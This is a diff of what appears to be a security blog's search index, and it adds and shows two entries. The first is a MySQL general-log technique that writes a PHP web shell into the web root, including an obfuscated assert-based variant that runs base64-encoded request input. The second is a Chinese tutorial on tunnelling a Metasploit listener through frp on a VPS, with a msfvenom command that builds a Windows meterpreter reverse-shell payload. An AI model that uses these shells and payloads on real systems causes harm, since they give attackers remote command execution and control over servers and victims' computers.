@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[MySQL's general-log shell]]></title>
+    <url>%2F2018%2F06%2F04%2FMySQL's%20general-log%20shell%2F</url>
+    <content type="text"><![CDATA[MySQL ROOT: show variables like &apos;%general%&apos;; set global general_log=&apos;on&apos;; SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;; SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;; SELECT &quot;&lt;?php $p = array(&apos;f&apos;=&gt;&apos;a&apos;,&apos;pffff&apos;=&gt;&apos;s&apos;,&apos;e&apos;=&gt;&apos;fffff&apos;,&apos;lfaaaa&apos;=&gt;&apos;r&apos;,&apos;nnnnn&apos;=&gt;&apos;t&apos;);$a = array_keys($p);$_=$p[&apos;pffff&apos;].$p[&apos;pffff&apos;].$a[2];$_= &apos;a&apos;.$_.&apos;rt&apos;;$_(base64_decode($_REQUEST[&apos;cmd&apos;]));?&gt;&quot;; set global general_log = off;]]></content>
+      <categories>
+        <category>shell</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
+        <tag>shell</tag>
+        <tag>log</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Frp结合VPS打造外网Meatsploit]]></title>
     <url>%2F2018%2F04%2F19%2FFrp%EF%BC%8BVPS%E6%89%93%E9%80%A0%E5%A4%96%E7%BD%91Meatsploit%2F</url>
     <content type="text"><![CDATA[前言： 本来一开始是在Vps上直接安装的MSF,想安装的可以试试，附一键脚本： curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall chmod 755 msfinstall &amp;&amp; ./msfinstall 可以用，但是总是时不时崩溃（可能是配置太低），烦的一pi.然后就去Google找到了ngrok的端口转发教程。试了下，可以用，不过用起来反应很慢，时不时还掉线，尼玛啊，最坑的是有的平台（VIP是不可能开的，这辈子都不可能）不能固定外网端口，启动一次客户端就换一个端口，每次都要改Payload，费劲。然后试了下用Frp来转发，相比起来简直不要太爽。 1. 准备工作： VPS一台FRP ##下载地址：https://github.com/fatedier/frp/releases（根据自己的VPS选择对应的版本） ２.安装步骤：在VPS上执行（我的是Centos x64）： wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64 rm frpc&amp;&amp;rm frpc.ini ##这个是客户端文件，用不上，删不删随意。 ./frps -c frps.ini ##默认配置文件启动服务端。 在自己电脑执行（我的是KALi x64）: wget https://github.com/fatedier/frp/releases/download/v0.16.1/frp_0.16.1_linux_amd64.tar.gz ##下载frp tar -zxvf frp_0.16.1_linux_amd64.tar.gz ##解压 cd frp_0.16.1_linux_amd64 rm frps&amp;&amp;rm frps.ini ##这个是服务端文件，用不上，删不删随意。 ./frpc -c frpc.ini ##使用配置文件启动客户端。 注意frpc.ini配置文件内容（详细参考）： [common] server_addr = *.*.*.* ##VPS的IP地址 server_port = 7000 [msf] type = tcp ##协议 local_ip = *.*.*.* ##本地内网主机IP。 local_port = 4444 ##本地MSF监听的端口 remote_port = 8011 ##Payload设置的LPORT端口,LHOST为VPS的IP。 Payload生成实例： $ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=VPS的IP lport=8011 -f exe -o payload.exe MSf监听示例： Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/x64/meterpreter_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) EXTENSIONS no Comma-separate list of extensions to load EXTINIT no Initialization strings for extensions LHOST 172.16.1.254 yes The listen address LPORT 4444 yes The listen port 附一张截图： 结束语：当然frp不止tcp端口转发这一种用法，还可以做socks5,http代理等，其他的自行查看说明文档。]]></content>
@@ -97,8 +110,8 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>msf</tag>
         <tag>shell</tag>
+        <tag>msf</tag>
       </tags>
   </entry>
   <entry>
